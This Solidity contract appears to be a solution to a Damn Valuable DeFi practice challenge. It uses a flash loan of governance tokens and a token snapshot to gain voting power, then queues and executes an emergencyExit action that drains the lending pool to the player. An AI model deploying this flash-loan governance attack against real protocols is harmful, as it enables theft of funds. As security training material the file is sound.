// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { SelfiePool } from "../selfie/SelfiePool.sol";
import { SimpleGovernance } from "../selfie/SimpleGovernance.sol";
import { DamnValuableTokenSnapshot } from "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 actionId;

    function queueAction(
        SelfiePool pool,
        address token,
        uint256 amount,
        SimpleGovernance governance,
        address player
    ) external {
        pool.flashLoan(this, token, amount, "");
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );
    }

    function executeAction(SimpleGovernance governance) external {
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address,
        address tokenAddress,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);
        token.snapshot();
        token.approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}
